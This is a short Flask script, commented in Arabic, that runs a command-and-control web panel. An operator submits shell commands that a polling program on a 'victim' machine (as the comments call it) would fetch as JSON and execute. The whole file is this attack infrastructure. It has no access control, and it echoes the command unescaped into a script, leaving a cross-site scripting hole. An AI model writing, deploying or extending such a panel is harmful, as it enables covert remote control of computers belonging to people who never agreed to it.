from flask import Flask, request, jsonify, render_template_string
import time

app = Flask(__name__)

# تخزين الأمر الحالي (افتراضياً انتظر)
current_command = {
    "cmd": "WAIT",
    "id": str(int(time.time()))
}

# 1. الواجهة الرسومية (الصفحة الرئيسية)
@app.route('/')
def index():
    html = """
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>لوحة التحكم</title>
        <style>
            body { font-family: Arial; background: #121212; color: white; text-align: center; padding: 50px; }
            input { padding: 10px; width: 300px; border-radius: 5px; border: none; }
            button { padding: 10px 20px; background: #007bff; color: white; border: none; cursor: pointer; border-radius: 5px; }
            button:hover { background: #0056b3; }
            .status { margin-top: 20px; color: #aaa; }
        </style>
    </head>
    <body>
        <h2>🎮 لوحة إرسال الأوامر</h2>
        <form action="/set-command" method="get">
            <input type="text" name="c" placeholder="اكتب الأمر هنا (مثلاً: dir أو calc)" required>
            <button type="submit">إرسال الأمر</button>
        </form>
        <div class="status">
            <p>الأمر الحالي: <strong style="color:#00ff00;">{{ cmd }}</strong></p>
            <p>رقم التعريف (ID): {{ id }}</p>
        </div>
        <hr>
        <p><a href="/get-command" style="color:cyan;">رابط مراقبة الضحية (JSON)</a></p>
    </body>
    </html>
    """
    return render_template_string(html, cmd=current_command['cmd'], id=current_command['id'])

# 2. المسار الذي يراقبه الضحية (JSON)
@app.route('/get-command', methods=['GET'])
def get_cmd():
    return jsonify(current_command)

# 3. المسار الذي يستقبل الأمر من الواجهة ويحدثه
@app.route('/set-command', methods=['GET'])
def set_cmd():
    cmd_text = request.args.get('c', 'WAIT')
    global current_command
    current_command = {
        "cmd": cmd_text,
        "id": str(int(time.time())) # توليد ID جديد بناءً على الوقت الحالي
    }
    # العودة للصفحة الرئيسية بعد الإرسال
    return f'''
    <script>
        alert("تم تحديث الأمر إلى: {cmd_text}");
        window.location.href = "/";
    </script>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
